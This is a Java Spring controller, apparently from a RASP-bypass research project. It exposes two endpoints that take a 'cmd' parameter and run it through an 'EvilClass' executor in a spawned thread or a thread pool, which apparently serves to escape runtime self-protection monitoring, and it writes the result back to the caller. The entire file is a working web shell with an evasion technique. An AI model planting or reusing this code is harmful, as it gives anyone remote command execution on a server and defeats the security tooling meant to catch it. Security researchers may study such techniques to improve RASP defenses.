package com.example.raspbypass.controller;

import com.example.raspbypass.Util.EvilClass;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

@Controller
@RequestMapping("/bypass3")
public class Bypass3 {

    private static String RESULT;
    private static String CMD;
    private static class EvilThread implements Runnable{

        @Override
        public void run() {
            EvilClass evilClass = new EvilClass();
            try {
                RESULT = evilClass.exec(CMD);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    private static void ModifyStaticField(String cmd){
        CMD = cmd;
    }

    @GetMapping("/thread")
    public void newThread(HttpServletRequest request, HttpServletResponse response) {
        try {
            String cmd = request.getParameter("cmd");
            ModifyStaticField(cmd);
            EvilThread thread = new EvilThread();
            new Thread(thread).start();
            response.getWriter().write(RESULT);
        } catch (Exception e) {
            try {
                response.getWriter().write(e.toString());
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }

    @GetMapping("/cachedthreadpool")
    public void newcachedthreadpool(HttpServletRequest request, HttpServletResponse response) {
        try {
            String cmd = request.getParameter("cmd");
            ModifyStaticField(cmd);
            EvilThread thread = new EvilThread();
            ExecutorService newCachedThreadPool = Executors.newCachedThreadPool();
            newCachedThreadPool.execute(thread);
            response.getWriter().write(RESULT);
        } catch (Exception e) {
            try {
                response.getWriter().write(e.toString());
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }
}
